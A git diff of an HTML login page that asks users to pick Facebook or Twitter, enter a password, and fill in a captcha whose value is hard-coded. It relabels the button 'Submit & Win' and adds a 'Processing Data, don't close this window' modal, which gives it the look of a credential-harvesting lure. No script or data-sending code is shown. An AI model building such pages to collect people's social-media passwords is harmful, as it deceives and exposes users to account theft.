@@ -30,16 +30,16 @@
                     <!-- <legend class="col-form-legend col-sm-2">Login Type</legend> -->
                     <div class="col-sm-10">
                         <div class="form-check form-check-inline">
-                            <input class="form-check-input" type="radio" name="gridRadios" id="gridRadios1"
-                                value="option1" checked>
-                            <label class="form-check-label" for="gridRadios1">
+                            <input class="form-check-input" type="radio" name="loginMedium" id="facebook"
+                                value="facebook" checked>
+                            <label class="form-check-label" for="facebook">
                                 <i class="fab fa-facebook"></i>
                             </label>
                         </div>
                         <div class="form-check form-check-inline">
-                            <input class="form-check-input" type="radio" name="gridRadios" id="gridRadios2"
-                                value="option2">
-                            <label class="form-check-label" for="gridRadios2">
+                            <input class="form-check-input" type="radio" name="loginMedium" id="twitter"
+                                value="twitter">
+                            <label class="form-check-label" for="twitter">
                                 <i class="fab fa-twitter"></i>
                             </label>
                         </div>
@@ -52,6 +52,12 @@
             <div class="form-group">
                 <input type="password" id="pass" class="form-control" placeholder="Password" minlength="8" required>
             </div>
+            <hr>
+            <div class="form-group">
+                <label for="captcha" class="captcha">XHT6</label>
+                <i class="fas fa-sync fa-2x"></i>
+                <input type="text" id="captcha" class="form-control" placeholder="captcha" maxlength="6" required>
+            </div>
             <div class="form-group">
                 <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="gridCheck" checked>
@@ -60,31 +66,29 @@
                     </label>
                 </div>
             </div>
-            <button class="btn btn-success btn-lg btn-block" id="tapatap">Proceed</button>
         </form>
+        <button class="btn btn-success btn-lg btn-block" id="tapatap">Submit & Win</button>
     </div>
 
-    <!-- <div class="modal circle-loader" tabindex="-1" role="dialog">
-        <div class="modal-dialog" role="document">
-        <div class="checkmark draw"></div>
-    </div> -->
+    <div class="container" id="term">
+
+    </div>
 
     <div class="modal" tabindex="-1" role="dialog" id="load-modal">
-        <div class="modal-dialog" role="document">
+        <div class="modal-dialog modal-dialog-centered" role="document">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h5 class="modal-title">Verifying account...</h5>
+                    <h5 class="modal-title" id="mod-title">Processing Data ...</h5>
                     <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                         <span aria-hidden="true">&times;</span>
                     </button>
                 </div>
                 <div class="modal-body">
+                    <!-- <div id="term"></div> -->
+                    <h5><r>Don't close this window !</r></h5>
                     <div class="container circle-loader">
                         <div class="checkmark draw"></div>
                     </div>
-                </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-primary">Proceed</button>
                 </div>
             </div>
         </div>
